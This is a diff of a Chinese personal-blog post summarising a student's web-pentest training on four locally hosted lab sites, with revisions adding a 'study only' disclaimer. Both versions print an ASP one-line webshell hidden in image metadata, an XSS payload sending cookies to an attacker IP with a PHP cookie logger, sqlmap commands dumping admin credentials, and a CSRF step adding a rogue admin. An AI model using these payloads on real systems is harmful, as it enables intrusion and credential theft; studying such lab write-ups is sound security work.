@@ -22,7 +22,7 @@
     <meta name="description" content="记录一个小白的成长">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>暑假实训实战总结 · RegenbogenLJ&#39;s Studio</title>
+    <title>实训实战总结 · RegenbogenLJ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >RegenbogenLJ&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">暑假实训实战总结</a>
+                <a href="#" class="post-name">实训实战总结</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            暑假实训实战总结
+            实训实战总结
             <!-- 404 -->
             
         </h1>
@@ -264,9 +264,17 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞">漏洞</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">828</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">855</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -395,48 +403,31 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h1><h2 id="紫帽中心小学：上传漏洞"><a href="#紫帽中心小学：上传漏洞" class="headerlink" title="紫帽中心小学：上传漏洞"></a>紫帽中心小学：上传漏洞</h2><h3 id="1-进入网站"><a href="#1-进入网站" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>网站功能正常可以使用。<br>​​<img src="/images/2019-7-12/1.png" alt> </p>
-<p>​​<img src="/images/2019-7-12/2.png" alt></p>
-<h3 id="2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><a href="#2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008" class="headerlink" title="2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008"></a>2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</h3><p>​​​​<img src="/images/2019-7-12/3.png" alt></p>
-<p>发现可以上传点<br>​​​​<img src="/images/2019-7-12/4.png" alt></p>
-<p>先传一个正常的图片，正常上传。<br>​​​​<img src="/images/2019-7-12/5.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/6.png" alt></p>
-<h3 id="3-小马的制作"><a href="#3-小马的制作" class="headerlink" title="3.小马的制作"></a>3.小马的制作</h3><p>修改图片的属性，标题和主题的内容为&lt;%eval request(“pass”)%&gt;<br>​​​​<img src="/images/2019-7-12/7.png" alt> </p>
-<h3 id="4-上传小马"><a href="#4-上传小马" class="headerlink" title="4.上传小马"></a>4.上传小马</h3><p>选择链接图片，成功上传木马图片。<br>​​​​<img src="/images/2019-7-12/8.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/9.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/10.png" alt></p>
-<p>点击查看按钮，页面跳转，内容显示为乱码，如图<br>​​​​<img src="/images/2019-7-12/11.png" alt></p>
-<h3 id="5-菜刀连接"><a href="#5-菜刀连接" class="headerlink" title="5.菜刀连接"></a>5.菜刀连接</h3><p>右键添加连接网站，网址为：<br><code>http://192.168.26.129/admin/UploadFile/pic/201971215222565533711.asp;.jpg</code></p>
-<p>​​​​<img src="/images/2019-7-12/12.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/13.png" alt></p>
-<p>连接成功后即可查看网站的目录文件。</p>
-<h3 id="6-上传大马"><a href="#6-上传大马" class="headerlink" title="6.上传大马"></a>6.上传大马</h3><p>​​​​<img src="/images/2019-7-12/14.png" alt></p>
-<h3 id="7-访问木马网页并登录"><a href="#7-访问木马网页并登录" class="headerlink" title="7.访问木马网页并登录"></a>7.访问木马网页并登录</h3><p>​​​​<img src="/images/2019-7-12/15.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/16.png" alt></p>
-<p>登录成功后，发现根本没有权限，尝试用kali爆，但是没有成功。</p>
-<h2 id="海河工作室xss漏洞可获取超级管理员权限"><a href="#海河工作室xss漏洞可获取超级管理员权限" class="headerlink" title="海河工作室xss漏洞可获取超级管理员权限"></a>海河工作室xss漏洞可获取超级管理员权限</h2><h3 id="1-进入网站-1"><a href="#1-进入网站-1" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>网站可以正常访问，如图所示，后台登录也很正常。<br>​​​​<img src="/images/2019-7-12/17.png" alt></p>
-<h3 id="2-留言板输入脚本"><a href="#2-留言板输入脚本" class="headerlink" title="2.留言板输入脚本"></a>2.留言板输入脚本</h3><p>脚本内容如下：<br><code>&lt;script&gt;document.location=&#39;http://192.168.65.100/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
+        <h1 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h1><blockquote>
+<p>注：网站源码，环境直接在本地搭建，第一个和第四个是搭在win 2003 server中，第二个和第三个搭在win7中。<br>此内容仅供学习，无其他用途。</p>
+</blockquote>
+<h2 id="紫帽中心小学"><a href="#紫帽中心小学" class="headerlink" title="紫帽中心小学"></a>紫帽中心小学</h2><h3 id="进入网站"><a href="#进入网站" class="headerlink" title="进入网站"></a>进入网站</h3><p>网站功能正常可以使用。<br>​​<img src="/images/2019-7-12/1.png" alt><br>​​<img src="/images/2019-7-12/2.png" alt></p>
+<h3 id="尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><a href="#尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008" class="headerlink" title="尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008"></a>尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</h3><p>​​​​<img src="/images/2019-7-12/3.png" alt><br>发现上传点<br>​​​​<img src="/images/2019-7-12/4.png" alt><br>先传一个正常的图片，正常上传。<br>​​​​<img src="/images/2019-7-12/5.png" alt><br>​​​​<img src="/images/2019-7-12/6.png" alt></p>
+<h3 id="小马的制作"><a href="#小马的制作" class="headerlink" title="小马的制作"></a>小马的制作</h3><p>修改图片的属性，标题和主题的内容为&lt;%eval request(“pass”)%&gt;<br>​​​​<img src="/images/2019-7-12/7.png" alt> </p>
+<h3 id="上传小马"><a href="#上传小马" class="headerlink" title="上传小马"></a>上传小马</h3><p>选择链接图片，成功上传木马图片。<br>​​​​<img src="/images/2019-7-12/8.png" alt><br>​​​​<img src="/images/2019-7-12/9.png" alt><br>​​​​<img src="/images/2019-7-12/10.png" alt><br>点击查看按钮，页面跳转，内容显示为乱码，如图<br>​​​​<img src="/images/2019-7-12/11.png" alt></p>
+<h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><p>右键添加连接网站，网址为：<br><code>http://192.168.26.129/admin/UploadFile/pic/201971215222565533711.asp;.jpg</code><br>​​​​<img src="/images/2019-7-12/12.png" alt><br>​​​​<img src="/images/2019-7-12/13.png" alt><br>连接成功后即可查看网站的目录文件。</p>
+<h3 id="上传大马"><a href="#上传大马" class="headerlink" title="上传大马"></a>上传大马</h3><p>​​​​<img src="/images/2019-7-12/14.png" alt></p>
+<h3 id="访问木马网页并登录"><a href="#访问木马网页并登录" class="headerlink" title="访问木马网页并登录"></a>访问木马网页并登录</h3><p>​​​​<img src="/images/2019-7-12/15.png" alt><br>​​​​<img src="/images/2019-7-12/16.png" alt><br>登录成功后，发现根本没有权限，尝试用kali爆，但是没有成功。</p>
+<h2 id="海河工作室xss漏洞可获取超级管理员权限"><a href="#海河工作室xss漏洞可获取超级管理员权限" class="headerlink" title="海河工作室xss漏洞可获取超级管理员权限"></a>海河工作室xss漏洞可获取超级管理员权限</h2><h3 id="进入网站-1"><a href="#进入网站-1" class="headerlink" title="进入网站"></a>进入网站</h3><p>网站可以正常访问，如图所示，后台登录也很正常。<br>​​​​<img src="/images/2019-7-12/17.png" alt></p>
+<h3 id="留言板输入脚本"><a href="#留言板输入脚本" class="headerlink" title="留言板输入脚本"></a>留言板输入脚本</h3><p>脚本内容如下：<br><code>&lt;script&gt;document.location=&#39;http://192.168.65.100/cookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></p>
 <p>​​​​<img src="/images/2019-7-12/18.png" alt><br>此脚本是为了管理员查看留言时自动获取cookie。其中Ip地址为攻击机，并且在攻击机中写一个cookie.php,内容如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$cookie .<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"done"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>获取的cookie值会保存在cookie.txt文件中。</p>
-<h3 id="3-登录后台admin进入后查看新留言。"><a href="#3-登录后台admin进入后查看新留言。" class="headerlink" title="3.登录后台admin进入后查看新留言。"></a>3.登录后台admin进入后查看新留言。</h3><p>发现done执行成功。<br>​​​​<img src="/images/2019-7-12/19.png" alt></p>
-<h3 id="4-进入攻击机kali"><a href="#4-进入攻击机kali" class="headerlink" title="4.进入攻击机kali"></a>4.进入攻击机kali</h3><p>开启apache2 ，命令如下：<br><code>systemctl start apache2</code><br>还有要给cookie.txt写入的权限。命令：<br><code>chmod 777 -Rf html/</code><br>后台查看留言后会自动出现cookie.txt，成功后，查看cookie.txt内容会看到cookie。<br>​​​​<img src="/images/2019-7-12/20.png" alt></p>
-<h3 id="5-进入网站后台"><a href="#5-进入网站后台" class="headerlink" title="5.进入网站后台"></a>5.进入网站后台</h3><p>右键“检查”—“application”—修改cookie，刷新网页，即可成功进入后台。如下图：<br>​​​​<img src="/images/2019-7-12/21.png" alt><br>​​<img src="/images/2019-7-12/22.png" alt><br>​​</p>
-<h2 id="hubmb网某处SQL注入导致管理员账号密码泄露"><a href="#hubmb网某处SQL注入导致管理员账号密码泄露" class="headerlink" title="hubmb网某处SQL注入导致管理员账号密码泄露"></a>hubmb网某处SQL注入导致管理员账号密码泄露</h2><h3 id="1-进入网页"><a href="#1-进入网页" class="headerlink" title="1.进入网页"></a>1.进入网页</h3><p>网页正常访问，后台也正常。<br>​​​​<img src="/images/2019-7-12/23.png" alt></p>
-<h3 id="2-观察URL，尝试SQL注入成功"><a href="#2-观察URL，尝试SQL注入成功" class="headerlink" title="2.观察URL，尝试SQL注入成功"></a>2.观察URL，尝试SQL注入成功</h3><p><code>http://192.168.222.69:81/ArticleRead.asp?id=777</code><br>​​​​<img src="/images/2019-7-12/24.png" alt></p>
-<h3 id="3-尝试用sqlmap爆库"><a href="#3-尝试用sqlmap爆库" class="headerlink" title="3.尝试用sqlmap爆库"></a>3.尝试用sqlmap爆库</h3><p><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –-dbs</code><br>结果如图：<br>​​​​<img src="/images/2019-7-12/25.png" alt><br>猜测<br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D user –table</code><br>发现没有这个数据库，继续利用sqlmap进行图中操作，得到数据库名和表名，结果如图：<br>​​​​<img src="/images/2019-7-12/26.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –column</code><br> 自动探测出user表中的信息，结果如图：<br>​​​​<img src="/images/2019-7-12/27.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –C user_id,user_pwd –dump</code><br> 可自动探测出用户名和密码内容，结果如图：<br>​​​​<img src="/images/2019-7-12/28.png" alt><br>获取到后台账号密码就可以登录后台了。</p>
-<h2 id="大连网站建设：CSRF漏洞"><a href="#大连网站建设：CSRF漏洞" class="headerlink" title="大连网站建设：CSRF漏洞"></a>大连网站建设：CSRF漏洞</h2><h3 id="1-进入网站-2"><a href="#1-进入网站-2" class="headerlink" title="1.进入网站"></a>1.进入网站</h3><p>输入IP地址，显示网站可正常访问，主页如图。<br>​​​​<img src="/images/2019-7-12/29.png" alt></p>
-<p>管理登录界面，使用后台功能。<br>​​​​<img src="/images/2019-7-12/30.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/31.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/32.png" alt></p>
-<p>​​​<img src="/images/2019-7-12/33.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/34.png" alt></p>
-<p>以上功能全部可正常使用。</p>
-<h3 id="2-登录后台，查看页面框架源代码。"><a href="#2-登录后台，查看页面框架源代码。" class="headerlink" title="2.登录后台，查看页面框架源代码。"></a>2.登录后台，查看页面框架源代码。</h3><p>发现form标签，修改标签并添加URL,如下图。<br>​​ ​​<img src="/images/2019-7-12/36.png" alt></p>
-<h3 id="3-向网站中添加非法管理员"><a href="#3-向网站中添加非法管理员" class="headerlink" title="3.向网站中添加非法管理员"></a>3.向网站中添加非法管理员</h3><p>将home.txt改为home.html，并双击打开，界面如下图，并向网站中添加非法管理员。<br>​​​​<img src="/images/2019-7-12/37.png" alt></p>
-<p>​​​​<img src="/images/2019-7-12/38.png" alt></p>
-<p>成为管理员，获取管理员权限。<br>​​​​<img src="/images/2019-7-12/38.png" alt></p>
+<h3 id="登录后台admin进入后查看新留言。"><a href="#登录后台admin进入后查看新留言。" class="headerlink" title="登录后台admin进入后查看新留言。"></a>登录后台admin进入后查看新留言。</h3><p>发现done执行成功。<br>​​​​<img src="/images/2019-7-12/19.png" alt></p>
+<h3 id="进入攻击机kali"><a href="#进入攻击机kali" class="headerlink" title="进入攻击机kali"></a>进入攻击机kali</h3><p>开启apache2 ，命令如下：<br><code>systemctl start apache2</code><br>还有要给cookie.txt写入的权限。命令：<br><code>chmod 777 -Rf html/</code><br>后台查看留言后会自动出现cookie.txt，成功后，查看cookie.txt内容会看到cookie。<br>​​​​<img src="/images/2019-7-12/20.png" alt></p>
+<h3 id="进入网站后台"><a href="#进入网站后台" class="headerlink" title="进入网站后台"></a>进入网站后台</h3><p>右键“检查”—“application”—修改cookie，刷新网页，即可成功进入后台。如下图：<br>​​​​<img src="/images/2019-7-12/21.png" alt><br>​​<img src="/images/2019-7-12/22.png" alt><br>​​</p>
+<h2 id="hubmb网某处SQL注入导致管理员账号密码泄露"><a href="#hubmb网某处SQL注入导致管理员账号密码泄露" class="headerlink" title="hubmb网某处SQL注入导致管理员账号密码泄露"></a>hubmb网某处SQL注入导致管理员账号密码泄露</h2><h3 id="进入网页"><a href="#进入网页" class="headerlink" title="进入网页"></a>进入网页</h3><p>网页正常访问，后台也正常。<br>​​​​<img src="/images/2019-7-12/23.png" alt></p>
+<h3 id="观察URL，尝试SQL注入成功"><a href="#观察URL，尝试SQL注入成功" class="headerlink" title="观察URL，尝试SQL注入成功"></a>观察URL，尝试SQL注入成功</h3><p><code>http://192.168.222.69:81/ArticleRead.asp?id=777</code><br>​​​​<img src="/images/2019-7-12/24.png" alt></p>
+<h3 id="尝试用sqlmap爆库"><a href="#尝试用sqlmap爆库" class="headerlink" title="尝试用sqlmap爆库"></a>尝试用sqlmap爆库</h3><p><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –-dbs</code><br>结果如图：<br>​​​​<img src="/images/2019-7-12/25.png" alt><br>猜测<br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D user –table</code><br>发现没有这个数据库，继续利用sqlmap进行图中操作，得到数据库名和表名，结果如图：<br>​​​​<img src="/images/2019-7-12/26.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –column</code><br> 自动探测出user表中的信息，结果如图：<br>​​​​<img src="/images/2019-7-12/27.png" alt><br><code>sqlmap –u“http://192.168.65.1:81/ArticleRead.asp?id=777” –D Microsoft_Access_masterdb –T admin –C user_id,user_pwd –dump</code><br> 可自动探测出用户名和密码内容，结果如图：<br>​​​​<img src="/images/2019-7-12/28.png" alt><br>获取到后台账号密码就可以登录后台了。</p>
+<h2 id="大连网站建设：CSRF漏洞"><a href="#大连网站建设：CSRF漏洞" class="headerlink" title="大连网站建设：CSRF漏洞"></a>大连网站建设：CSRF漏洞</h2><h3 id="进入网站-2"><a href="#进入网站-2" class="headerlink" title="进入网站"></a>进入网站</h3><p>输入IP地址，显示网站可正常访问，主页如图。<br>​​​​<img src="/images/2019-7-12/29.png" alt><br>管理登录界面，使用后台功能。<br>​​​​<img src="/images/2019-7-12/30.png" alt><br>​​​​<img src="/images/2019-7-12/31.png" alt><br>​​​​<img src="/images/2019-7-12/32.png" alt><br>​​​<img src="/images/2019-7-12/33.png" alt><br>​​​​<img src="/images/2019-7-12/34.png" alt><br>以上功能全部可正常使用。</p>
+<h3 id="登录后台，查看页面框架源代码。"><a href="#登录后台，查看页面框架源代码。" class="headerlink" title="登录后台，查看页面框架源代码。"></a>登录后台，查看页面框架源代码。</h3><p>发现form标签，修改标签并添加URL,如下图。<br>​​ ​​<img src="/images/2019-7-12/35.png" alt></p>
+<h3 id="向网站中添加管理员"><a href="#向网站中添加管理员" class="headerlink" title="向网站中添加管理员"></a>向网站中添加管理员</h3><p>将home.txt改为home.html，并双击打开，界面如下图，并向网站中添加非法管理员。<br>​​​​<img src="/images/2019-7-12/36.png" alt><br>​​​​<img src="/images/2019-7-12/37.png" alt><br>成为管理员，获取管理员权限。<br>​​​​<img src="/images/2019-7-12/38.png" alt></p>
 
     </article>
     <!-- license  -->
@@ -560,7 +551,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实战总结"><span class="toc-number">1.</span> <span class="toc-text">实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#紫帽中心小学：上传漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">紫帽中心小学：上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-小马的制作"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.小马的制作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-上传小马"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.上传小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-菜刀连接"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.菜刀连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-上传大马"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.上传大马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-访问木马网页并登录"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.访问木马网页并登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#海河工作室xss漏洞可获取超级管理员权限"><span class="toc-number">1.2.</span> <span class="toc-text">海河工作室xss漏洞可获取超级管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-留言板输入脚本"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.留言板输入脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-登录后台admin进入后查看新留言。"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.登录后台admin进入后查看新留言。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-进入攻击机kali"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.进入攻击机kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-进入网站后台"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.进入网站后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hubmb网某处SQL注入导致管理员账号密码泄露"><span class="toc-number">1.3.</span> <span class="toc-text">hubmb网某处SQL注入导致管理员账号密码泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网页"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.进入网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-观察URL，尝试SQL注入成功"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.观察URL，尝试SQL注入成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-尝试用sqlmap爆库"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.尝试用sqlmap爆库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大连网站建设：CSRF漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">大连网站建设：CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-进入网站-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-登录后台，查看页面框架源代码。"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.登录后台，查看页面框架源代码。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-向网站中添加非法管理员"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.向网站中添加非法管理员</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实战总结"><span class="toc-number">1.</span> <span class="toc-text">实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#紫帽中心小学"><span class="toc-number">1.1.</span> <span class="toc-text">紫帽中心小学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进入网站"><span class="toc-number">1.1.1.</span> <span class="toc-text">进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#尝试登录后台，发现账号密码太弱，-账号密码为：admin-admin008"><span class="toc-number">1.1.2.</span> <span class="toc-text">尝试登录后台，发现账号密码太弱， 账号密码为：admin/admin008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小马的制作"><span class="toc-number">1.1.3.</span> <span class="toc-text">小马的制作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传小马"><span class="toc-number">1.1.4.</span> <span class="toc-text">上传小马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#菜刀连接"><span class="toc-number">1.1.5.</span> <span class="toc-text">菜刀连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传大马"><span class="toc-number">1.1.6.</span> <span class="toc-text">上传大马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#访问木马网页并登录"><span class="toc-number">1.1.7.</span> <span class="toc-text">访问木马网页并登录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#海河工作室xss漏洞可获取超级管理员权限"><span class="toc-number">1.2.</span> <span class="toc-text">海河工作室xss漏洞可获取超级管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进入网站-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#留言板输入脚本"><span class="toc-number">1.2.2.</span> <span class="toc-text">留言板输入脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录后台admin进入后查看新留言。"><span class="toc-number">1.2.3.</span> <span class="toc-text">登录后台admin进入后查看新留言。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进入攻击机kali"><span class="toc-number">1.2.4.</span> <span class="toc-text">进入攻击机kali</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进入网站后台"><span class="toc-number">1.2.5.</span> <span class="toc-text">进入网站后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hubmb网某处SQL注入导致管理员账号密码泄露"><span class="toc-number">1.3.</span> <span class="toc-text">hubmb网某处SQL注入导致管理员账号密码泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进入网页"><span class="toc-number">1.3.1.</span> <span class="toc-text">进入网页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#观察URL，尝试SQL注入成功"><span class="toc-number">1.3.2.</span> <span class="toc-text">观察URL，尝试SQL注入成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#尝试用sqlmap爆库"><span class="toc-number">1.3.3.</span> <span class="toc-text">尝试用sqlmap爆库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大连网站建设：CSRF漏洞"><span class="toc-number">1.4.</span> <span class="toc-text">大连网站建设：CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进入网站-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">进入网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录后台，查看页面框架源代码。"><span class="toc-number">1.4.2.</span> <span class="toc-text">登录后台，查看页面框架源代码。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#向网站中添加管理员"><span class="toc-number">1.4.3.</span> <span class="toc-text">向网站中添加管理员</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -682,19 +673,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 11
+        Total : 9
         </div>
         <!-- search  -->
         
@@ -710,7 +691,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/实训实战总结/" >暑假实训实战总结</a>
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/实训实战总结/" >实训实战总结</a>
         </li>
     
     
@@ -753,16 +734,6 @@ top:50vh;
             <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/photos/" >photos</a>
         </li>
     
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2019/06/16/world/" >world</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2019/06/16/test/" >test</a>
-        </li>
-    
     </div>
   </div>
         <div class="sidebar-panel-tags">
@@ -770,13 +741,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
     
-        <span class="sidebar-tag-name" data-tags="交换机"><span class="iconfont-archer">&#xe606;</span>交换机</span>
+        <span class="sidebar-tag-name" data-tags="VLAN"><span class="iconfont-archer">&#xe606;</span>VLAN</span>
     
         <span class="sidebar-tag-name" data-tags="H3C"><span class="iconfont-archer">&#xe606;</span>H3C</span>
     
-        <span class="sidebar-tag-name" data-tags="VLAN"><span class="iconfont-archer">&#xe606;</span>VLAN</span>
+        <span class="sidebar-tag-name" data-tags="交换机"><span class="iconfont-archer">&#xe606;</span>交换机</span>
     
         <span class="sidebar-tag-name" data-tags="photo"><span class="iconfont-archer">&#xe606;</span>photo</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
         <span class="sidebar-tag-name" data-tags="路由"><span class="iconfont-archer">&#xe606;</span>路由</span>
     
